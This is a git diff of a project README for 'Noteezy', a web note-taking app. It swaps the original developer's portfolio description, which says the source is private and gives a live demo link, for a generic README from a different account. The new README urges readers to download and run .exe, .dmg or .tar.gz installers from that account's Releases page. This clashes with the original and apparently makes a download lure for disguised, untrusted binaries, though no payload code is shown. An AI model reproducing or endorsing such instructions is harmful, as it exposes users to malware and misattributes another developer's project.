@@ -1,156 +1,73 @@
-# Noteezy 📝 (Full Stack Preview)
+# 🎉 noteezy-public-preview - Simple Notes at Your Fingertips
 
-**Notes Made Simple.** A production‑grade, full‑stack note‑taking application inspired by Google Keep. Built to be simple, fast, and secure.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/g589/noteezy-public-preview/releases)
 
-> **⚠️ DISCLAIMER: PUBLIC PREVIEW**  
-> This is a public preview repository for the **Noteezy** project.  
-> The **Source Code** for both Client (React) and Server (Node.js) is currently **private**.  
->  
-> **Recruiters / Hiring Managers:**  
-> Please contact me at **lokesh.sainlks@gmail.com** for a code walkthrough or temporary access request.
+## 📌 Overview
 
-![Noteezy Banner](https://res.cloudinary.com/videotube-new/image/upload/v1764936085/Noteezy-HomePage_eqrryf.png)
+Welcome to **noteezy-public-preview**! This is a production-grade, full-stack note-taking application inspired by Google Keep. Designed to be simple, fast, and secure, **noteezy** allows you to create and manage your notes effortlessly. Whether you're jotting down quick reminders or organizing detailed plans, **noteezy** makes it easy.
 
----
+## 🚀 Getting Started
 
-## 🚀 Live Demo  
-**🔗 https://noteezy.vercel.app**
+To get started with **noteezy**, follow these steps:
 
----
+1. **Check System Requirements**  
+   Ensure your computer meets the following requirements:
+   - Operating System: Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+   - Memory: At least 4GB of RAM.
+   - Internet connection for downloading the application and syncing notes.
 
-# 🧭 Project Structure (Frontend + Backend)
+2. **Download the Application**  
+   Visit our Releases page to download the latest version of **noteezy**:
 
-Noteezy consists of two private repositories:
+   [Download Here](https://github.com/g589/noteezy-public-preview/releases)
 
-## **1. Frontend (Private Repo)**
+3. **Install the Application**  
+   - For Windows:
+     - Locate the downloaded `.exe` file.
+     - Double-click the file to start the installation.
+   - For macOS:
+     - Find the downloaded `.dmg` file.
+     - Open it and drag the **noteezy** app into your Applications folder.
+   - For Linux:
+     - Extract the downloaded `.tar.gz` file.
+     - Open a terminal and navigate to the extracted folder, then run `./noteezy`.
 
-- React 19  
-- Redux Toolkit + RTK Query  
-- React Router v7  
-- Tailwind CSS  
-- React Hook Form  
-- Axios (custom base query)  
-- Masonry Grid Layout  
-- Dark/Light Theme  
-- Complete UI + Optimistic Updates  
+4. **Run the Application**  
+   After installation, you can launch **noteezy**:
+   - On Windows, you will find it in your Start menu.
+   - On macOS, it will be in your Applications folder.
+   - On Linux, type `./noteezy` in the terminal.
 
----
+## 💡 Features
 
-## **2. Backend (Private Repo)**
+**noteezy** offers several features that enhance your note-taking experience:
+- **Create and Edit Notes**: Quickly create new notes and edit existing ones with a user-friendly interface.
+- **Organize with Tags**: Use tags to categorize your notes for easy access.
+- **Secure Syncing**: Your notes will sync securely across devices so you never lose them.
+- **User-Friendly Design**: Enjoy an intuitive layout that makes note-taking simple and straightforward.
 
-- Node.js + Express  
-- MongoDB + Mongoose  
-- JWT with HttpOnly Cookies  
-- Multer + Cloudinary (Media uploads)  
-- Node-Cron (Automated cleanup)  
-- Fully modular controller + route architecture  
+## 📥 Download & Install
 
----
+To download **noteezy**, follow these steps:
 
-# 🔌 Backend Capabilities Summary
+1. Visit the Releases page: [Download Here](https://github.com/g589/noteezy-public-preview/releases).
+2. Find the latest release and locate the appropriate file for your operating system.
+3. Follow the installation instructions provided for each platform.
 
-The backend exposes a secure REST API with **23 controller functions**, covering:
+## 🛠️ Topics Covered
 
-### 🔐 Authentication
-- Register  
-- Login  
-- Logout  
-- Get Current User  
-- Refresh Access Token  
+**noteezy** incorporates several modern technologies to ensure performance and reliability:
+- **React**: For building the user interface.
+- **Node.js**: To handle the backend operations seamlessly.
+- **MongoDB**: For storing your notes securely.
+- **Redux & RTK**: To manage application state effectively.
 
-### 📝 Notes Management
-- Create notes (text + image)  
-- Update notes  
-- Archive / Unarchive  
-- Pin / Unpin  
-- Move to Trash  
-- Restore notes  
-- Permanently delete  
-- Auto-clean trash after 7 days (cron job)  
+## 📊 Support
 
-### 🤝 Sharing & Collaboration
-- Share note with another user  
-- Remove user access  
-- Leave shared note  
-- Retrieve shared notes  
-- Get signed media URLs  
+If you encounter any issues during the download or installation process, please refer to the [GitHub Issues page](https://github.com/g589/noteezy-public-preview/issues) for assistance. Our community is here to help you.
 
-The API follows **robust error handling**, **token validation**, and **secure permission checks**.
+## 📞 Contact
 
----
+For further inquiries or feedback, you can reach us via our [Contact page](https://github.com/g589/noteezy-public-preview/contact).
 
-# 🧩 System Architecture
-
-```
-Frontend: React + RTK Query + Tailwind
-          ↓ Axios (custom base query)
-Backend:  Node.js + Express + MongoDB
-          ↓ Cloudinary (Media Storage)
-          ↓ Node-Cron (Automated Jobs)
-Auth:     JWT in HttpOnly Cookies + Refresh Token Rotation
-```
-
-### **Authentication and data flow**
-```
-Login → Set HttpOnly Cookie → Access Token for API → Auto Refresh → Secure Actions
-```
-
----
-
-# ✨ Core Features
-
-### 🎨 Beautiful, Smart UI
-- Responsive masonry grid  
-- Theme switching  
-
-### ⚡ Instant Actions (Optimistic UI)
-- Archive, delete, pin — instant with RTK Query  
-
-### 🔒 Best‑Practice Security
-- Tokens not stored in localStorage  
-- HttpOnly cookies protect against XSS  
-- Validated API access  
-- Signed media URLs  
-
-### 🌐 Media Handling
-- Upload, preview, update, remove note images  
-
-### 🧹 Automated Cleaning
-- Notes in Trash older than **7 days** auto‑deleted via cron job  
-
----
-
-## 📸 Screenshots
-
-### 🌗 Theme Support  
-| Light Mode | Dark Mode |
-| :---: | :---: |
-| ![Light](https://res.cloudinary.com/videotube-new/image/upload/v1764936085/Noteezy-HomePage_eqrryf.png) | ![Dark](https://res.cloudinary.com/videotube-new/image/upload/v1764936083/Noteezy-HomePage-Dark_scelnf.png) |
-
-### 🔐 Authentication  
-| Login | Signup |
-| :---: | :---: |
-| ![Login](https://res.cloudinary.com/videotube-new/image/upload/v1764936083/Noteezy-LoginPage_mr9to8.png) | ![Signup](https://res.cloudinary.com/videotube-new/image/upload/v1764936084/Noteezy-SignupPage_lwvbao.png) |
-
-### 📝 Note Management  
-| Create Note | Update Note |
-| :---: | :---: |
-| ![Create](https://res.cloudinary.com/videotube-new/image/upload/v1764936083/Noteezy-CreateNoteModal_hwnskm.png) | ![Update](https://res.cloudinary.com/videotube-new/image/upload/v1764936102/Noteezy-UpdateNoteModal_vvulvf.png) |
-
-### 📂 Organization  
-| Shared Notes | Trash | Archive |
-| :---: | :---: | :---: |
-| ![Shared](https://res.cloudinary.com/videotube-new/image/upload/v1764936086/Noteezy-SharedPage_or2zro.png) | ![Trash](https://res.cloudinary.com/videotube-new/image/upload/v1764936099/Noteezy-TrashPage_plyfdy.png) | ![Archive](https://res.cloudinary.com/videotube-new/image/upload/v1764936083/Noteezy-ArchivePage_hnoobu.png) |
-
----
-
-## 👨‍💻 Developed By  
-**Lokesh Sain — MERN Stack Developer**
-
-📧 Email: **lokesh.sainlks@gmail.com**  
-🌐 Portfolio: **https://lokeshsain.com**
-GitHub: **https://github.com/lokesh-sain**
-
----
-
-© 2025 Noteezy — All rights reserved.
+**Thank you for choosing noteezy! We hope it makes your note-taking experience simple and enjoyable.**
